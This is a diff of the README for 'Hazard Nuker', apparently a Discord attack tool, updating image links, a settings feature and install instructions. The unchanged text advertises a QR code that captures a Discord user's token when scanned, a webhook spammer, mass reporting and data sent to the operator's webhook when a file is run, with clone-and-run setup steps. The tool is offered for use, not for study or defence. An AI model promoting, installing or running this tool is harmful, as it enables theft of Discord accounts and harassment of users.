@@ -19,9 +19,19 @@
 
 #### Hazard Nuker was made by
 Love ❌
-code ✅
+Code ✅
 
 ### Features
+* `Settings | Theme changer, Thread amount, Cancel key`
+<p align="left">
+ <img alt="theme1" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme1.png" width="10%">
+ <img alt="theme2" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme2.png" width="10%">
+</p>
+<p align="left">
+ <img alt="theme3" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme3.png" width="10%">
+ <img alt="theme4" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/theme4.png" width="10%">
+</p>
+
 * ` Many options while being compact`
 * ` Auto update`
 * ` Easy and fast`
@@ -45,9 +55,9 @@ code ✅
 * ` Webhook deleter/spammer`
 
 <p align="center">
- <img alt="HazardNuker" src="https://cdn.discordapp.com/attachments/927621195225002095/933399042900254730/unknown.png" width="45%">
+ <img alt="HazardNuker" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/HazardNuker.png" width="45%">
 &nbsp; &nbsp; &nbsp; &nbsp;
- <img alt="HazardNukerUpdate" src="https://cdn.discordapp.com/attachments/853347983639052318/863399932240855060/unknown.png" width="45%">
+ <img alt="HazardNukerUpdate" src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/HazardUpdate.png" width="45%">
 </p>
 
 ## Features in detail
@@ -149,7 +159,7 @@ Upon running the file you will get the following sent to your webhook:
 * Creates a QR code that will give you a discord user's token if they scan it
 > Webhook looks like this:
 
-<p align="left"><img src="https://i.imgur.com/Gxvz43V.png"</p>
+<p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/QR-code.jpg"</p>
 
 #### [15] Mass Report
 * Mass report a user of your choice
@@ -172,9 +182,7 @@ Upon running the file you will get the following sent to your webhook:
 ---
 
 ### ❗・Important
-* Make sure to have [Python](https://www.python.org/downloads/) before [Downloading](https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip) Hazard
-* Also make sure to have python added to [PATH](https://datatofish.com/add-python-to-windows-path/)
-* Please Join the [discord server](https://cheataway.com) or contact me if you get any sort of major error with Hazard
+* Found a bug? Join the [discord](https://cheataway.com) and contact rdimo or create an issue about it directly in [here!](https://github.com/Rdimo/Hazard-Nuker/issues/new/choose)
 * Some people have made a version of Hazard Nuker that looks/works like this one just that it's malicious, please make sure you only download stuff from here to make sure your info doesn't get stolen
 
 ## 🤓・For you skids
@@ -193,6 +201,8 @@ Open HazardNuker.exe
 
 #### 2st・Installation (source code)
 ```
+download git: https://git-scm.com/downloads
+open cmd in chosen folder and type:
 git clone https://github.com/Rdimo/Hazard-Nuker.git
 cd Hazard-Nuker
 start setup.bat
